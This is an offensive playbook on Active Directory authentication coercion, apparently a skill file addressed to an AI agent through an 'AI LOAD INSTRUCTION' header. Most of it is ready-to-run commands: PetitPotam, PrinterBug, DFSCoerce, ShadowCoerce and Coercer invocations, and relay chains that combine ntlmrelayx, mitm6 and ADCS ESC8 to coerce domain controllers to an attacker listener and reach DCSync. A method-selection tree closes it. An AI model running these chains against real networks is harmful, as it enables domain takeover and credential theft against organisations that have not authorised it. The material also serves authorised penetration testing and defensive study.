# Authentication Coercion Methods

> **AI LOAD INSTRUCTION**: Load this for detailed authentication coercion method comparison, RPC function-level details, and the Coercer tool usage. Assumes the main [SKILL.md](./SKILL.md) is already loaded for NTLM relay fundamentals.

---

## 1. COERCION METHODS MATRIX

| Method | RPC Interface | Function | Protocol | Auth Type | Requires Creds? | Target |
|---|---|---|---|---|---|---|
| **PetitPotam** | MS-EFSR (lsarpc) | EfsRpcOpenFileRaw + variants | SMB (445) | Machine account | No (unauthenticated on unpatched) | DC/Any |
| **PrinterBug** | MS-RPRN (spoolss) | RpcRemoteFindFirstPrinterChangeNotificationEx | SMB (445) | Machine account | Yes (domain user) | Any with Spooler |
| **DFSCoerce** | MS-DFSNM (netdfs) | NetrDfsRemoveStdRoot / NetrDfsAddStdRoot | SMB (445) | Machine account | Yes (domain user) | DC |
| **ShadowCoerce** | MS-FSRVP (fssagent) | IsPathShadowCopied / IsPathSupported | SMB (445) | Machine account | Yes (domain user) | File servers |
| **MSEven** | MS-EVEN (eventlog) | ElfrOpenBELW | SMB (445) | Machine account | Yes (domain user) | Any |
| **CheeseOunce** | MS-EVEN | OpenEventLogW (via named pipe) | SMB (445) | Machine account | Yes | Any |

---

## 2. PETITPOTAM — MS-EFSR ABUSE

### Unauthenticated (Pre-Patch / Misconfigured)

```bash
# Original PetitPotam — unauthenticated
PetitPotam.py LISTENER_IP TARGET_IP

# Specific EFS functions:
PetitPotam.py -method EfsRpcOpenFileRaw LISTENER_IP TARGET_IP
PetitPotam.py -method EfsRpcEncryptFileSrv LISTENER_IP TARGET_IP
```

### Authenticated

```bash
# With credentials (required on patched systems)
PetitPotam.py -u user -p password -d domain.com LISTENER_IP TARGET_IP
```

### EFS RPC Function Variants

| Function | Patched? | Notes |
|---|---|---|
| `EfsRpcOpenFileRaw` | Patched (Nov 2021) | Original PetitPotam function |
| `EfsRpcEncryptFileSrv` | Patched later | Alternative function |
| `EfsRpcDecryptFileSrv` | Partially patched | May still work |
| `EfsRpcQueryUsersOnFile` | Partially patched | May still work |
| `EfsRpcQueryRecoveryAgents` | Partially patched | May still work |
| `EfsRpcFileKeyInfo` | Varies | Check per target |

---

## 3. PRINTERBUG — MS-RPRN (SPOOLSAMPLE)

### Prerequisites
- Print Spooler service running on target
- Valid domain credentials

```bash
# SpoolSample (Windows)
SpoolSample.exe TARGET_HOST LISTENER_HOST

# printerbug.py (Impacket)
printerbug.py DOMAIN/user:password@TARGET_IP LISTENER_IP

# Dementor (Python)
python3 dementor.py -d domain.com -u user -p password LISTENER_IP TARGET_IP
```

### Check If Spooler Is Running

```bash
# From Linux
rpcdump.py DOMAIN/user:pass@TARGET_IP | grep -i spoolss

# CrackMapExec
crackmapexec smb TARGET_IP -u user -p pass -M spooler
```

---

## 4. DFSCOERCE — MS-DFSNM

```bash
# DFSCoerce
python3 dfscoerce.py -u user -p password -d domain.com LISTENER_IP TARGET_IP

# Specific functions
python3 dfscoerce.py -u user -p password -d domain.com \
  -method NetrDfsRemoveStdRoot LISTENER_IP TARGET_IP
```

### MS-DFSNM Functions

| Function | Notes |
|---|---|
| `NetrDfsRemoveStdRoot` | Primary coercion function |
| `NetrDfsAddStdRoot` | Alternative |

---

## 5. SHADOWCOERCE — MS-FSRVP

Exploits the File Server VSS Agent Service (requires the service to be running — common on file servers).

```bash
# ShadowCoerce
python3 shadowcoerce.py -u user -p password -d domain.com LISTENER_IP TARGET_IP
```

### MS-FSRVP Functions

| Function | Notes |
|---|---|
| `IsPathShadowCopied` | Primary function |
| `IsPathSupported` | Alternative function |
| `GetShareMapping` | Another variant |

---

## 6. COERCER — AUTOMATED DISCOVERY TOOL

[Coercer](https://github.com/p0dalirius/Coercer) automates testing all known coercion methods.

```bash
# Scan for available coercion methods on target
coercer scan -u user -p password -d domain.com -t TARGET_IP

# Coerce using all available methods
coercer coerce -u user -p password -d domain.com -t TARGET_IP -l LISTENER_IP

# Specific method
coercer coerce -u user -p password -d domain.com -t TARGET_IP -l LISTENER_IP \
  --filter-method-name EfsRpcOpenFileRaw

# Unauthenticated scan
coercer scan -t TARGET_IP

# Filter by protocol
coercer coerce -u user -p password -d domain.com -t TARGET_IP -l LISTENER_IP \
  --filter-protocol-name MS-EFSR
```

### Coercer Output Interpretation

```
[+] MS-EFSR - EfsRpcOpenFileRaw      → Listening? Check relay!
[+] MS-RPRN - RpcRemoteFindFirst...   → Spooler running, exploitable
[-] MS-FSRVP - IsPathShadowCopied    → Service not running
[-] MS-DFSNM - NetrDfsRemoveStdRoot  → Access denied (non-DC?)
```

---

## 7. COERCION + RELAY ATTACK COMBINATIONS

### Combo 1: PetitPotam + LDAP Relay → RBCD

```bash
# Terminal 1: Start relay
ntlmrelayx.py -t ldap://DC02_IP --delegate-access -smb2support

# Terminal 2: Coerce DC01
PetitPotam.py ATTACKER_IP DC01_IP

# Result: RBCD set on DC01$ → impersonate admin to DC01
getST.py -spn cifs/DC01.domain.com -impersonate administrator DOMAIN/'EVIL$':'pass'
```

### Combo 2: PrinterBug + Unconstrained Delegation

```bash
# On compromised host with unconstrained delegation:
Rubeus.exe monitor /interval:5 /nowrap /targetuser:DC01$

# Trigger from anywhere:
printerbug.py DOMAIN/user:pass@DC01 UNCONSTRAINED_HOST

# Capture DC01$ TGT → DCSync
```

### Combo 3: PetitPotam + ADCS Relay (ESC8)

```bash
# Terminal 1: Relay to ADCS
ntlmrelayx.py -t http://CA_HOST/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController

# Terminal 2: Coerce DC
PetitPotam.py ATTACKER_IP DC01_IP

# Result: Certificate for DC01$ → authenticate → DCSync
certipy auth -pfx dc01.pfx -dc-ip DC02_IP
```

### Combo 4: mitm6 + LDAP Relay → Shadow Credentials

```bash
# Terminal 1: mitm6 DNS takeover
mitm6 -d domain.com

# Terminal 2: Relay to LDAP with shadow credentials
ntlmrelayx.py -6 -t ldap://DC_IP -wh fake-wpad.domain.com --shadow-credentials -smb2support

# Result: Shadow credential added on victim machine → PKINIT auth
```

### Combo 5: WebDAV Coercion + LDAP Relay (Bypass SMB Signing)

```bash
# Terminal 1: Start relay
ntlmrelayx.py -t ldap://DC_IP --delegate-access -smb2support

# Terminal 2: Coerce via WebDAV (HTTP-based, no SMB signing issue)
PetitPotam.py ATTACKER@80/test WORKSTATION_IP
# Workstation's WebClient service sends HTTP-based NTLM → clean relay
```

---

## 8. COERCION METHOD SELECTION TREE

```
Need to coerce authentication
│
├── Target is a Domain Controller?
│   ├── PetitPotam (unauthenticated if unpatched)
│   ├── PetitPotam (authenticated — most reliable)
│   ├── DFSCoerce (if DFS role installed)
│   └── PrinterBug (if Spooler running — rare on modern DCs)
│
├── Target is a file server?
│   ├── ShadowCoerce (if FSRVP agent running)
│   ├── PetitPotam (authenticated)
│   └── PrinterBug (if Spooler running)
│
├── Target is a workstation?
│   ├── PrinterBug (Spooler usually running)
│   ├── PetitPotam (authenticated)
│   └── WebDAV coercion (if WebClient running — HTTP-based!)
│
├── No creds available?
│   ├── PetitPotam unauthenticated (unpatched systems only)
│   ├── Responder poisoning (passive capture)
│   └── mitm6 (DHCPv6 DNS takeover)
│
├── Need HTTP-based NTLM (bypass SMB signing)?
│   ├── WebDAV coercion from workstation
│   └── mitm6 WPAD trigger
│
└── Not sure what works?
    └── Use Coercer tool: coercer scan -t TARGET
```
